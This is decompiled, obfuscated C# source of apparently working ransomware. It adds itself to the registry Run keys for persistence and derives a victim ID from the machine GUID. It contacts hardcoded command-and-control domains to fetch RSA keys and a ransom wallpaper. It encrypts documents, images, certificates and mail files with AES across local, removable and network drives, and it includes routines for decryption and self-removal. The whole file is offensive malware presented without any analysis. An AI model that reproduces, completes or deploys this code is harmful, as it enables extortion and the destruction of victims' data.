using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text.RegularExpressions;

public class GClass0
{
	public struct GStruct0
	{
		public int int_0;

		public string string_0;

		public string string_1;

		public string string_2;

		public string string_3;

		public string string_4;

		public string string_5;

		public string string_6;
	}

	public string string_0 = (string)Delegate169.smethod_0("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Cryptography", "MachineGuid", "");

	public string string_1 = "bSMMwxDWhhkyLIU/Q4dWXg==";

	public string string_2 = "<RSAKeyValue><Modulus>3YUdEa5ACyZ/51u81ESh8P5NOyMF3OAam+Zm8BD9Qt4+ckyLgQfeUC/gGmtzXFA4ppKawxgD5uxnWmjrBvqGVIXCiWRxfH4idp6IHCn7gqEwRc9cQk6O7r125EhEaM0V1VzykwO3Gbpmv6B6dPsd6deQSnE8ZH0lbHkRRz55yBD+ZfN7/w+87uffbWVygeiwi4C01D2OgWMujbtaimuDUwTFylUSzVMS1CirAWBYj8kMNXE/GZNpNPiaJ9NfzlMO4afu6ciMiIXGFv5t8mC7xQl+2fwMSCjY9w7x60n90V+TYmPSAbnYRwa54Rw1dt41ca4hWhEsbjhz//vy6XVnqQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

	public string string_3;

	public RegistryKey registryKey_0;

	public RegistryKey registryKey_1;

	public string string_4;

	public int int_0 = 7200;

	public double double_0 = 0.3;

	public int int_1 = 1000;

	public int int_2 = 1;

	public int int_3 = 1;

	public DateTime dateTime_0;

	public string string_5 = Delegate120.smethod_0(Environment.SpecialFolder.Desktop);

	public string[] string_6 = new string[]
	{
		".3fr",
		".accdb",
		".ai",
		".arw",
		".bay",
		".cdr",
		".cer",
		".cr2",
		".crt",
		".jpr",
		".pdf",
		".crw",
		".dbf",
		".dcr",
		".der",
		".dng",
		".doc",
		".docm",
		".docx",
		".dwg",
		".jpf",
		".png",
		".dxf",
		".dxg",
		".eps",
		".erf",
		".indd",
		".jpe",
		".jpg",
		".kdc",
		".mdb",
		".mdf",
		".mp4",
		".mef",
		".mrw",
		".nef",
		".nrw",
		".odb",
		".odm",
		".odp",
		".ods",
		".odt",
		".orf",
		".gif",
		".p12",
		".p7b",
		".p7c",
		".pdd",
		".pef",
		".pem",
		".pfx",
		".ppt",
		".pptm",
		".pptx",
		".frx",
		".psd",
		".pst",
		".ptx",
		".r3d",
		".raf",
		".raw",
		".rtf",
		".rw2",
		".rwl",
		".srf",
		".accdb",
		".srw",
		".wb2",
		".wpd",
		".wps",
		".xlk",
		".xls",
		".xlsb",
		".xlsm",
		".xlsx",
		".eml"
	};

	[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool MoveFileEx(string string_7, string string_8, int int_4);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(int int_4, int int_5, string string_7, int int_6);

	public bool method_0(string string_7)
	{
		for (int i = 0; i < Delegate96.smethod_0(string_7); i++)
		{
			char c = Delegate119.smethod_0(string_7, i);
			if (c < '0' || c > '9')
			{
				return false;
			}
		}
		return true;
	}

	public void method_1()
	{
		this.method_7();
		string text = Delegate120.smethod_0(Environment.SpecialFolder.ApplicationData);
		string string_ = Delegate123.smethod_0(Delegate122.smethod_0(Delegate121.smethod_0()));
		string text2 = Delegate123.smethod_1(Delegate122.smethod_0(Delegate121.smethod_0()));
		string text3 = Delegate124.smethod_0("/F /IM ", text2);
		string object_ = Delegate125.smethod_0(text, "\\", this.string_3, ".exe");
		this.registryKey_0 = Delegate126.smethod_0(Registry.CurrentUser, Delegate88.smethod_0("Software\\", this.string_3, "\\Files"));
		this.registryKey_1 = Delegate126.smethod_0(Registry.CurrentUser, Delegate88.smethod_0("Software\\", this.string_3, "\\Keys"));
		if (this.registryKey_1 == null)
		{
			Delegate127.smethod_0(Delegate88.smethod_0("HKEY_CURRENT_USER\\Software\\", this.string_3, "\\Keys"), "", "", RegistryValueKind.String);
		}
		if (this.registryKey_0 == null)
		{
			Delegate127.smethod_0(Delegate88.smethod_0("HKEY_CURRENT_USER\\Software\\", this.string_3, "\\Files"), "", "", RegistryValueKind.String);
		}
		Delegate127.smethod_0("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", this.string_3, object_, RegistryValueKind.String);
		Delegate127.smethod_0("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", Delegate124.smethod_0("*", this.string_3), object_, RegistryValueKind.String);
		Delegate128.smethod_0(string_, FileAttributes.Hidden);
		if (Delegate129.smethod_0(text) && !Delegate129.smethod_1(object_))
		{
			Delegate104.smethod_0(10000);
			try
			{
				Delegate130.smethod_0(string_, object_);
				ProcessStartInfo processStartInfo = Delegate21.smethod_0();
				Delegate131.smethod_0(processStartInfo, object_);
				ProcessStartInfo processStartInfo2 = Delegate21.smethod_0();
				Delegate132.smethod_0(processStartInfo2, false);
				Delegate132.smethod_1(processStartInfo2, true);
				Delegate131.smethod_0(processStartInfo2, "taskkill");
				Delegate131.smethod_1(processStartInfo2, text3);
				Delegate133.smethod_0(processStartInfo);
				GClass0.MoveFileEx(string_, null, 4);
				Delegate133.smethod_0(processStartInfo2);
			}
			catch (Exception)
			{
			}
		}
	}

	public bool method_2(string string_7, int int_4)
	{
		bool result = false;
		string text = this.method_9(48, "");
		string text2 = this.method_8(Delegate124.smethod_0(string_7, text));
		if (Delegate98.smethod_0(text2, ""))
		{
			int num = Delegate134.smethod_0(text2);
			if (num == int_4)
			{
				return true;
			}
		}
		return result;
	}

	public void method_3()
	{
		string text = Delegate123.smethod_0(Delegate122.smethod_0(Delegate121.smethod_0()));
		string text2 = Delegate135.smethod_0(Delegate123.smethod_1(Delegate122.smethod_0(Delegate121.smethod_0())), ".exe", "");
		ProcessStartInfo processStartInfo = Delegate21.smethod_0();
		Delegate131.smethod_0(processStartInfo, text);
		while (true)
		{
			Process[] array = Delegate136.smethod_0(text2);
			int num = array.Length;
			if (num < 2)
			{
				Delegate133.smethod_0(processStartInfo);
			}
			Delegate104.smethod_0(500);
		}
	}

	public string method_4()
	{
		bool flag = true;
		Delegate22.smethod_0();
		string[] array = new string[]
		{
			"cabin.su",
			"wrax.ru"
		};
		string[] array2 = new string[]
		{
			"icals.ru",
			"hips.su",
			"yot.su"
		};
		for (int i = 0; i < array.Length; i++)
		{
			try
			{
				IPHostEntry object_ = Delegate137.smethod_0(array[i]);
				string result = Delegate138.smethod_0(object_);
				return result;
			}
			catch (SocketException)
			{
				flag = false;
			}
		}
		if (!flag)
		{
			for (int j = 0; j < array2.Length; j++)
			{
				try
				{
					IPHostEntry object_2 = Delegate137.smethod_0(array2[j]);
					string result = Delegate138.smethod_0(object_2);
					return result;
				}
				catch (SocketException)
				{
				}
			}
		}
		return array[0];
	}

	public List<string> method_5()
	{
		DriveInfo[] array = Delegate139.smethod_0();
		List<string> list = new List<string>();
		DriveInfo[] array2 = array;
		for (int i = 0; i < array2.Length; i++)
		{
			DriveInfo object_ = array2[i];
			if (Delegate98.smethod_1(Delegate141.smethod_0(Delegate140.smethod_0(object_)), "Fixed") || Delegate98.smethod_1(Delegate141.smethod_0(Delegate140.smethod_0(object_)), "Removable") || Delegate98.smethod_1(Delegate141.smethod_0(Delegate140.smethod_0(object_)), "Network"))
			{
				list.Add(Delegate142.smethod_0(object_));
			}
		}
		return list;
	}

	public bool method_6(string string_7)
	{
		Match object_ = Delegate144.smethod_0(Delegate143.smethod_0(string_7), "c:\\\\users\\\\(.+)\\\\appdata\\\\(.+)?$");
		Match object_2 = Delegate144.smethod_0(Delegate143.smethod_0(string_7), "c:\\\\windows(\\\\$)?(.+)?$");
		Match object_3 = Delegate144.smethod_0(Delegate143.smethod_0(string_7), "c:\\\\program files(\\\\$)?(.+)?$");
		Match object_4 = Delegate144.smethod_0(Delegate143.smethod_0(string_7), "c:\\\\users\\\\public\\\\pictures\\\\sample pictures");
		Match object_5 = Delegate144.smethod_0(Delegate143.smethod_0(string_7), "c:\\\\program files \\(x64\\)(\\\\$)?(.+)?$");
		Match object_6 = Delegate144.smethod_0(Delegate143.smethod_0(string_7), "c:\\\\\\$(.+)?$");
		return Delegate145.smethod_0(object_) || Delegate145.smethod_0(object_2) || Delegate145.smethod_0(object_3) || Delegate145.smethod_0(object_5) || Delegate145.smethod_0(object_4) || Delegate145.smethod_0(object_6);
	}

	public string method_7()
	{
		SHA1CryptoServiceProvider object_ = Delegate23.smethod_0();
		AesCryptoServiceProvider object_2 = Delegate24.smethod_0();
		Delegate147.smethod_0(object_2, Delegate146.smethod_0(this.string_1));
		ICryptoTransform icryptoTransform_ = Delegate149.smethod_0(object_2, Delegate148.smethod_0(object_2), Delegate148.smethod_0(object_2));
		using (MemoryStream memoryStream = Delegate25.smethod_0())
		{
			using (CryptoStream cryptoStream = Delegate26.smethod_0(memoryStream, icryptoTransform_, CryptoStreamMode.Write))
			{
				using (StreamWriter streamWriter = Delegate27.smethod_0(cryptoStream))
				{
					Delegate150.smethod_0(streamWriter, this.string_0);
				}
				this.string_3 = Delegate135.smethod_0(Delegate153.smethod_0(Delegate152.smethod_0(object_, Delegate151.smethod_0(memoryStream))), "-", "");
			}
		}
		this.string_3 = Delegate154.smethod_0(this.string_3, 0, 10);
		return this.string_3;
	}

	public string method_8(string string_7)
	{
		bool flag = false;
		string text = null;
		while (!flag)
		{
			try
			{
				WebRequest object_ = Delegate155.smethod_0(string_7);
				Delegate157.smethod_0(object_, Delegate156.smethod_0());
				HttpWebResponse object_2 = (HttpWebResponse)Delegate158.smethod_0(object_);
				Stream stream = Delegate159.smethod_0(object_2);
				StreamReader object_3 = Delegate28.smethod_0(stream);
				text = Delegate160.smethod_0(object_3);
				if (text != null)
				{
					flag = true;
				}
				Delegate161.smethod_0(object_3);
				Delegate162.smethod_0(stream);
				Delegate163.smethod_0(object_2);
			}
			catch (WebException)
			{
				continue;
			}
			Delegate104.smethod_0(this.int_1);
		}
		return text;
	}

	public string method_9(int int_4, string string_7)
	{
		int num = 0;
		string result = null;
		RSACryptoServiceProvider object_ = Delegate29.smethod_0(2048);
		Delegate164.smethod_0(object_, this.string_2);
		if (Delegate98.smethod_0(this.string_0, ""))
		{
			char[] array = Delegate165.smethod_0(this.string_0);
			char[] array2 = new char[array.Length + 1];
			for (int i = 0; i < array.Length; i++)
			{
				if (i == 12)
				{
					array2[num++] = (char)int_4;
				}
				array2[num] = array[i];
				num++;
			}
			string text = Delegate124.smethod_0(Delegate30.smethod_0(array2), string_7);
			byte[] byte_ = Delegate168.smethod_0(object_, Delegate167.smethod_0(Delegate166.smethod_0(), text), false);
			result = Delegate153.smethod_1(byte_);
		}
		return result;
	}

	public void method_10()
	{
		string string_ = Delegate125.smethod_0(Delegate120.smethod_0(Environment.SpecialFolder.ApplicationData), "\\", this.string_3, ".img");
		string string_2 = Delegate125.smethod_0(Delegate120.smethod_0(Environment.SpecialFolder.ApplicationData), "\\", this.string_3, ".bmp");
		string text = Delegate88.smethod_0("HKEY_CURRENT_USER\\Software\\", this.string_3, "\\Keys");
		byte[] byte_ = (byte[])Delegate169.smethod_0(text, "Wallpaper", "Can't receive wallpaper");
		Delegate170.smethod_0(string_, byte_);
		Bitmap object_ = (Bitmap)Delegate171.smethod_0(string_);
		Delegate172.smethod_0(object_, string_2);
		GClass0.SystemParametersInfo(20, 0, string_2, 3);
		RegistryKey object_2 = Delegate173.smethod_0(Registry.CurrentUser, "Control Panel\\Desktop", true);
		Delegate174.smethod_0(object_2, "WallpaperStyle", 0);
		Delegate175.smethod_0(object_2);
		Delegate128.smethod_0(string_, FileAttributes.Hidden);
		Delegate128.smethod_0(string_2, FileAttributes.Hidden);
		GClass0.MoveFileEx(string_, null, 4);
	}

	public void method_11(string string_7)
	{
		string text = this.method_9(53, "");
		string text2 = Delegate88.smethod_0("HKEY_CURRENT_USER\\Software\\", this.string_3, "\\Keys");
		string text3 = Delegate125.smethod_0(Delegate120.smethod_0(Environment.SpecialFolder.ApplicationData), "\\", this.string_3, ".img");
		try
		{
			WebRequest object_ = Delegate155.smethod_0(Delegate124.smethod_0(string_7, text));
			Delegate157.smethod_0(object_, Delegate156.smethod_0());
			HttpWebResponse object_2 = (HttpWebResponse)Delegate158.smethod_0(object_);
			BinaryReader object_3 = Delegate31.smethod_0(Delegate159.smethod_0(object_2));
			byte[] array = Delegate176.smethod_0(object_3, 10485760);
			using (FileStream fileStream = Delegate32.smethod_0(text3, FileMode.Create))
			{
				Delegate177.smethod_0(fileStream, array, 0, array.Length);
			}
			byte[] object_4 = Delegate146.smethod_1(text3);
			Delegate127.smethod_0(text2, "Wallpaper", object_4, RegistryValueKind.Binary);
			Delegate178.smethod_0(object_3);
			Delegate163.smethod_0(object_2);
			Delegate100.smethod_1(text3);
			Delegate104.smethod_0(this.int_1);
		}
		catch (WebException)
		{
		}
	}

	public bool method_12(string string_7)
	{
		bool flag = false;
		string text = Delegate88.smethod_0("HKEY_CURRENT_USER\\Software\\", this.string_3, "\\Keys");
		string text2 = (string)Delegate169.smethod_0(text, "Public", "");
		if (Delegate98.smethod_1(text2, ""))
		{
			while (!flag)
			{
				string text3 = this.method_9(49, Delegate179.smethod_0(new object[]
				{
					":",
					this.int_2,
					":",
					this.int_3
				}));
				string object_ = this.method_8(Delegate124.smethod_0(string_7, text3));
				if (Delegate98.smethod_0(object_, ""))
				{
					Delegate127.smethod_0(text, "Public", object_, RegistryValueKind.String);
					return true;
				}
				Delegate104.smethod_0(this.int_1);
			}
			return false;
		}
		Delegate100.smethod_2("Public already exsits");
		return true;
	}

	public bool method_13(string string_7)
	{
		bool flag = false;
		string text = Delegate88.smethod_0("HKEY_CURRENT_USER\\Software\\", this.string_3, "\\Keys");
		string text2 = (string)Delegate169.smethod_0(text, "Private", "");
		string text3 = this.method_9(51, "");
		if (Delegate98.smethod_0(text2, ""))
		{
			flag = true;
		}
		while (!flag)
		{
			string object_ = this.method_8(Delegate124.smethod_0(string_7, text3));
			if (Delegate98.smethod_0(object_, "503"))
			{
				Delegate127.smethod_0(text, "Private", object_, RegistryValueKind.String);
				flag = true;
			}
			Delegate104.smethod_0(this.int_1);
		}
		return flag;
	}

	public void method_14(string string_7, GClass0.GStruct0 gstruct0_0)
	{
		string string_8 = null;
		if (gstruct0_0.int_0 == 0)
		{
			string_8 = Delegate124.smethod_0(":B:", gstruct0_0.string_0);
		}
		if (gstruct0_0.int_0 == 1)
		{
			string_8 = Delegate124.smethod_0(":M:", gstruct0_0.string_1);
		}
		if (gstruct0_0.int_0 == 2)
		{
			string_8 = Delegate180.smethod_0(new string[]
			{
				":U:",
				gstruct0_0.string_4,
				":",
				gstruct0_0.string_2,
				":",
				gstruct0_0.string_5,
				":",
				gstruct0_0.string_3,
				":",
				gstruct0_0.string_6
			});
		}
		string text = this.method_9(52, string_8);
		this.method_8(Delegate124.smethod_0(string_7, text));
	}

	public void method_15(string string_7)
	{
		string text = this.method_9(50, "");
		string[] array = Delegate181.smethod_0(this.method_8(Delegate124.smethod_0(string_7, text)), new char[]
		{
			'+'
		});
		try
		{
			this.int_0 = Delegate134.smethod_0(array[0]);
			this.string_4 = array[1];
		}
		catch (Exception)
		{
		}
	}

	public bool method_16(string string_7)
	{
		string[] array = Delegate182.smethod_0(this.registryKey_0);
		string[] array2 = array;
		for (int i = 0; i < array2.Length; i++)
		{
			string text = array2[i];
			if (Delegate98.smethod_1(text, string_7))
			{
				return true;
			}
		}
		return false;
	}

	public void method_17(string string_7)
	{
		string text = Delegate124.smethod_0(Class5.smethod_0<string>(99835095u, 15038730591190274483uL), this.string_3);
		string text2 = Delegate124.smethod_0(text, "\\Keys");
		string text3 = Delegate124.smethod_0(text, "\\Files");
		string text4 = Delegate124.smethod_0(string_7, ".tmp");
		AesCryptoServiceProvider object_ = Delegate24.smethod_0();
		RSACryptoServiceProvider object_2 = Delegate33.smethod_0();
		string text5 = (string)Delegate169.smethod_0(text2, "Public", "No Public Key was found!");
		if (Delegate98.smethod_0(text5, ""))
		{
			Delegate164.smethod_0(object_2, text5);
			byte[] byte_ = Delegate168.smethod_0(object_2, Delegate148.smethod_0(object_), false);
			string object_3 = Delegate153.smethod_1(byte_);
			using (FileStream fileStream = Delegate32.smethod_0(text4, FileMode.Create))
			{
				using (AesCryptoServiceProvider aesCryptoServiceProvider = Delegate24.smethod_0())
				{
					using (CryptoStream cryptoStream = Delegate26.smethod_0(fileStream, Delegate149.smethod_0(aesCryptoServiceProvider, Delegate148.smethod_0(object_), Delegate148.smethod_0(object_)), CryptoStreamMode.Write))
					{
						using (FileStream fileStream2 = Delegate32.smethod_0(string_7, FileMode.Open))
						{
							Delegate183.smethod_0(aesCryptoServiceProvider, 256);
							Delegate183.smethod_1(aesCryptoServiceProvider, 128);
							int num;
							while ((num = Delegate185.smethod_0(fileStream2)) != -1)
							{
								Delegate184.smethod_0(cryptoStream, (byte)num);
							}
						}
					}
				}
			}
			StreamWriter object_4 = Delegate34.smethod_0(text4, true);
			Delegate187.smethod_0(Delegate186.smethod_0(object_4), 0L, SeekOrigin.End);
			Delegate150.smethod_0(object_4, object_3);
			Delegate188.smethod_0(object_4);
			Delegate127.smethod_0(text3, string_7, Delegate96.smethod_0(object_3), RegistryValueKind.DWord);
			Delegate100.smethod_1(string_7);
			Delegate130.smethod_1(text4, string_7);
		}
	}

	public void method_18(string string_7)
	{
		string text = Delegate124.smethod_0(Class3.smethod_0<string>(1039446687u, 331866531155298722uL), this.string_3);
		string text2 = Delegate124.smethod_0(text, "\\Keys");
		Delegate124.smethod_0(text, "\\Files");
		string text3 = Delegate124.smethod_0(string_7, ".tmp");
		Delegate24.smethod_0();
		Delegate189.smethod_0(true);
		RSACryptoServiceProvider object_ = Delegate33.smethod_0();
		string text4 = (string)Delegate169.smethod_0(text2, "Private", "No Private Key was found!");
		if (Delegate98.smethod_0(text4, ""))
		{
			Delegate164.smethod_0(object_, text4);
			byte[] byte_ = new byte[344];
			FileStream object_2 = Delegate35.smethod_0(string_7, FileMode.Open, FileAccess.Read);
			Delegate187.smethod_0(object_2, -344L, SeekOrigin.End);
			Delegate190.smethod_0(object_2, byte_, 0, 344);
			string text5 = Delegate191.smethod_0(Delegate166.smethod_0(), byte_);
			byte[] byte_2 = Delegate146.smethod_0(text5);
			byte[] array = Delegate168.smethod_1(object_, byte_2, false);
			Delegate153.smethod_1(array);
			Delegate162.smethod_0(object_2);
			FileStream object_3 = Delegate35.smethod_0(string_7, FileMode.Open, FileAccess.ReadWrite);
			Delegate193.smethod_0(object_3, Delegate192.smethod_0(object_3) - 344L);
			Delegate162.smethod_0(object_3);
			using (FileStream fileStream = Delegate32.smethod_0(text3, FileMode.Create))
			{
				using (AesManaged aesManaged = Delegate36.smethod_0())
				{
					using (CryptoStream cryptoStream = Delegate26.smethod_0(fileStream, Delegate149.smethod_1(aesManaged, array, array), CryptoStreamMode.Write))
					{
						using (FileStream fileStream2 = Delegate32.smethod_0(string_7, FileMode.Open))
						{
							Delegate183.smethod_0(aesManaged, 256);
							Delegate183.smethod_1(aesManaged, 128);
							int num;
							while ((num = Delegate185.smethod_0(fileStream2)) != -1)
							{
								Delegate184.smethod_0(cryptoStream, (byte)num);
							}
						}
					}
				}
			}
			Delegate100.smethod_1(string_7);
			Delegate130.smethod_1(text3, string_7);
		}
	}

	public void method_19(List<string> list_0, string string_7)
	{
		try
		{
			string[] array = Delegate194.smethod_0(string_7, "*.*");
			for (int i = 0; i < array.Length; i++)
			{
				string text = array[i];
				string object_ = Delegate195.smethod_0(text);
				string[] array2 = this.string_6;
				for (int j = 0; j < array2.Length; j++)
				{
					string text2 = array2[j];
					if (Delegate98.smethod_1(text2, Delegate143.smethod_0(object_)) && !this.method_16(text))
					{
						list_0.Add(text);
						this.method_17(text);
					}
				}
			}
			string[] array3 = Delegate196.smethod_0(string_7);
			for (int k = 0; k < array3.Length; k++)
			{
				string string_8 = array3[k];
				if (!this.method_6(string_8))
				{
					this.method_19(list_0, string_8);
				}
			}
		}
		catch (Exception object_2)
		{
			Delegate100.smethod_2(Delegate197.smethod_0(object_2));
		}
	}

	public string[] method_20()
	{
		this.registryKey_0 = Delegate126.smethod_0(Registry.CurrentUser, Delegate88.smethod_0("Software\\", this.string_3, "\\Files"));
		return Delegate182.smethod_0(this.registryKey_0);
	}

	public bool method_21(string string_7)
	{
		string text = Delegate88.smethod_0(Class3.smethod_1<string>(1465117900u, 11523132775189630644uL), this.string_3, "\\Files");
		RegistryKey registryKey = Delegate173.smethod_0(Registry.CurrentUser, text, true);
		if (!Delegate129.smethod_1(string_7))
		{
			Delegate198.smethod_0(registryKey, string_7);
			return false;
		}
		try
		{
			this.method_18(string_7);
		}
		catch (Exception)
		{
		}
		if (registryKey != null)
		{
			Delegate198.smethod_0(registryKey, string_7);
			return true;
		}
		return false;
	}

	public int method_22()
	{
		RegistryKey object_ = Delegate126.smethod_0(Registry.CurrentUser, Delegate88.smethod_0("Software\\", this.string_3, "\\Files"));
		string[] array = Delegate182.smethod_0(object_);
		return array.Length - 1;
	}

	public void method_23()
	{
		string text = Delegate120.smethod_0(Environment.SpecialFolder.Desktop);
		string[] array = Delegate194.smethod_0(text, "*.*");
		for (int i = 0; i < array.Length; i++)
		{
			string string_ = array[i];
			string text2 = Delegate195.smethod_0(string_);
			string[] array2 = this.string_6;
			for (int j = 0; j < array2.Length; j++)
			{
				string text3 = array2[j];
				if (Delegate98.smethod_1(text3, text2))
				{
					try
					{
						this.method_18(string_);
						goto IL_63;
					}
					catch (Exception)
					{
						goto IL_63;
					}
					break;
				}
				IL_63:;
			}
		}
	}

	public void method_24()
	{
		string text = Delegate120.smethod_0(Environment.SpecialFolder.ApplicationData);
		string string_ = Delegate125.smethod_0(text, "\\", this.string_3, ".exe");
		string text2 = Delegate125.smethod_0(text, "\\", this.string_3, ".bmp");
		string text3 = Delegate124.smethod_0("/F /IM ", Delegate123.smethod_1(Delegate122.smethod_0(Delegate121.smethod_0())));
		RegistryKey registryKey = Delegate173.smethod_0(Registry.CurrentUser, "Software", true);
		RegistryKey registryKey2 = Delegate173.smethod_0(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
		RegistryKey registryKey3 = Delegate173.smethod_0(Registry.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true);
		if (registryKey2 != null)
		{
			Delegate198.smethod_0(registryKey2, this.string_3);
		}
		if (registryKey3 != null)
		{
			Delegate198.smethod_0(registryKey3, Delegate124.smethod_0("*", this.string_3));
		}
		if (registryKey != null)
		{
			Delegate198.smethod_1(registryKey, this.string_3);
		}
		if (Delegate129.smethod_1(string_))
		{
			Delegate128.smethod_0(string_, FileAttributes.Hidden);
			GClass0.MoveFileEx(string_, null, 4);
			try
			{
				Delegate100.smethod_1(text2);
			}
			catch (Exception)
			{
			}
		}
		ProcessStartInfo processStartInfo = Delegate21.smethod_0();
		Delegate132.smethod_0(processStartInfo, false);
		Delegate132.smethod_1(processStartInfo, true);
		Delegate131.smethod_0(processStartInfo, "taskkill");
		Delegate131.smethod_1(processStartInfo, text3);
		Delegate133.smethod_0(processStartInfo);
	}
}
